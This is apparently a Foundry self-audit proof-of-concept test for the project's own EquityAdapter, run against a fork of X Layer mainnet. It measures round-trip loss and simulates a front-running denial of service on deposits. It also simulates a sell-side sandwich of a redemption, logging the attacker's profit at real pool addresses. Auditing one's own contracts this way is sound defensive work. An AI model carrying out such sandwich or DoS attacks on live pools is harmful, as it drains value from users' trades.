// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SelfHostedEquityOracle} from "../../src/oracles/SelfHostedEquityOracle.sol";
import {EquityAdapter} from "../../src/adapters/EquityAdapter.sol";

interface IRouter {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams calldata) external payable returns (uint256);
}

/// @notice SELF-AUDIT PoC. Fork X Layer mainnet and probe the EquityAdapter's live pricing/swap
///         surface: round-trip realized loss, buy-side floor headroom (DoS), and a sell-side sandwich
///         of a user-triggered redemption. This test acts as the adapter's `vault`, so it can drive
///         deposit/withdraw directly. Read-only against a fork; touches no live state.
///         forge test --match-contract EquityMevFork --fork-url https://rpc.xlayer.tech \
///           --fork-block-number 70869200 -vv
contract EquityMevFork is Test {
    address constant USDT0 = 0x779Ded0c9e1022225f8E0630b35a9b54bE713736;
    address constant USDG = 0x4ae46a509F6b1D9056937BA4500cb143933D2dc8;
    address constant ROUTER = 0x4f0C28f5926AFDA16bf2506D5D9e57Ea190f9bcA;
    address constant WNVDA = 0xa8ddb5Cd96b5222AFe198316E9A57CAA642850D5;
    uint24 constant FEE1 = 100; // USDT0/USDG
    uint24 constant FEE2 = 500; // USDG/wNVDA
    bytes32 constant FEED = bytes32("NVDA");
    uint32 constant REGULAR = 2;
    uint256 constant MAX_AGE = 1 hours;
    uint256 constant SLIP = 200; // 2%, live value

    // Live oracle price at the pin block (SelfHostedEquityOracle.priceWad(NVDA)).
    uint256 constant ORACLE_PX = 213_900000000000000000; // 213.9e18

    SelfHostedEquityOracle oracle;
    EquityAdapter adapter;
    bytes buyPath;
    bytes sellPath;

    address attacker = address(0xA11CE);

    function setUp() public {
        if (block.chainid != 196) return;
        oracle = new SelfHostedEquityOracle(address(this), address(this));
        oracle.registerFeed(FEED, true);
        buyPath = abi.encodePacked(USDT0, FEE1, USDG, FEE2, WNVDA);
        sellPath = abi.encodePacked(WNVDA, FEE2, USDG, FEE1, USDT0);
        adapter = new EquityAdapter(
            USDT0, WNVDA, address(oracle), FEED, ROUTER, address(this), buyPath, sellPath, MAX_AGE, SLIP
        );
        oracle.submitPrice(FEED, ORACLE_PX, REGULAR, uint32(block.timestamp));
        // fund this contract (acting as the vault) so it can supply USDT0 to the adapter
        deal(USDT0, address(this), 10_000_000e6);
        IERC20(USDT0).approve(address(adapter), type(uint256).max);
    }

    function _bal(address t, address a) internal view returns (uint256) {
        return IERC20(t).balanceOf(a);
    }

    // ---- (1) baseline: round-trip realized loss at live prices, no attacker ----
    function test_baseline_roundtrip() public {
        if (block.chainid != 196) return;
        uint256 amt = 1_000e6;
        uint256 navBefore = adapter.balanceOf(address(0)); // 0
        adapter.deposit(amt);
        uint256 held = _bal(WNVDA, address(adapter));
        uint256 navAfterBuy = adapter.balanceOf(address(0)); // marked at oracle
        console2.log("bought wNVDA wei:", held);
        console2.log("NAV marked after buy (USDT0):", navAfterBuy);
        console2.log("immediate NAV markdown vs 1000 in (USDT0):", int256(navAfterBuy) - int256(int256(amt)));
        // full exit
        uint256 out = adapter.withdraw(type(uint256).max);
        console2.log("round-trip USDT0 out:", out);
        console2.log("realized round-trip loss (USDT0):", int256(amt) - int256(out));
        navBefore; navAfterBuy;
    }

    // ---- (2) buy-side floor headroom: how small a price nudge reverts the agent's allocate ----
    function test_buy_floor_headroom_dos() public {
        if (block.chainid != 196) return;
        deal(USDT0, attacker, 100_000e6);
        uint256[6] memory sizes = [uint256(50e6), 100e6, 200e6, 300e6, 500e6, 1_000e6];
        for (uint256 i; i < sizes.length; ++i) {
            uint256 snap = vm.snapshotState();
            vm.startPrank(attacker);
            IERC20(USDT0).approve(ROUTER, sizes[i]);
            IRouter(ROUTER).exactInput(
                IRouter.ExactInputParams({path: buyPath, recipient: attacker, amountIn: sizes[i], amountOutMinimum: 0})
            );
            vm.stopPrank();
            try adapter.deposit(1_000e6) returns (uint256) {
                console2.log("front-run buy (USDT0), agent allocate STILL OK:", sizes[i]);
            } catch {
                console2.log("front-run buy (USDT0), agent allocate REVERTED (DoS):", sizes[i]);
            }
            vm.revertToState(snap);
        }
    }

    // ---- (3) sell-side sandwich of a user-triggered redemption (withdraw is uncapped) ----
    // Sweep attacker push sizes: right-sized push extracts value; over-push trips the sell floor.
    function test_sell_side_sandwich() public {
        if (block.chainid != 196) return;
        // Seed a ~20k USDT0 position directly (represents many small MAX_MOVE buys accumulated over
        // time; a single 20k buy would itself trip the 2% buy floor, which is why we deal it in).
        uint256 heldStock = 90e18; // ~90 wNVDA (~$19.3k at oracle)
        deal(WNVDA, address(adapter), heldStock);

        uint256 snap0 = vm.snapshotState();
        uint256 honest = adapter.withdraw(type(uint256).max);
        vm.revertToState(snap0);
        console2.log("position wNVDA wei:", heldStock);
        console2.log("honest sell (no sandwich) -> USDT0:", honest);

        // attacker inventory: wNVDA to dump (push price down), 0 USDT0
        uint256[6] memory push = [uint256(2_000e6), 5_000e6, 10_000e6, 20_000e6, 40_000e6, 80_000e6];
        for (uint256 i; i < push.length; ++i) {
            uint256 snap = vm.snapshotState();
            // fund attacker with enough wNVDA to sell `push` USDT0-worth (buy it via a deal)
            uint256 atkStock = (push[i] * 1e12 * 1e18) / ORACLE_PX; // ~push worth of shares, wei
            deal(WNVDA, attacker, atkStock);
            deal(USDT0, attacker, 0);

            vm.startPrank(attacker);
            IERC20(WNVDA).approve(ROUTER, atkStock);
            IRouter(ROUTER).exactInput(
                IRouter.ExactInputParams({path: sellPath, recipient: attacker, amountIn: atkStock, amountOutMinimum: 0})
            );
            vm.stopPrank();

            uint256 agentOut;
            bool sold;
            try adapter.withdraw(type(uint256).max) returns (uint256 o) {
                sold = true;
                agentOut = o;
            } catch {
                sold = false;
            }

            // attacker buys back with all USDT0
            vm.startPrank(attacker);
            uint256 usdtIn = _bal(USDT0, attacker);
            IERC20(USDT0).approve(ROUTER, usdtIn);
            uint256 back = IRouter(ROUTER).exactInput(
                IRouter.ExactInputParams({path: buyPath, recipient: attacker, amountIn: usdtIn, amountOutMinimum: 0})
            );
            vm.stopPrank();

            int256 stockDelta = int256(back) - int256(atkStock); // net wNVDA gained
            int256 pnl = stockDelta * int256(ORACLE_PX) / 1e18 / 1e12; // in USDT0 6dp @ oracle
            console2.log("--- push USDT0-worth:", push[i]);
            console2.log("  agent sell ok?", sold);
            console2.log("  agent sell out (USDT0):", agentOut);
            console2.log("  pool loss vs honest (USDT0):", int256(honest) - int256(agentOut));
            console2.log("  attacker PnL (USDT0 @oracle):", pnl);
            vm.revertToState(snap);
        }
    }
}
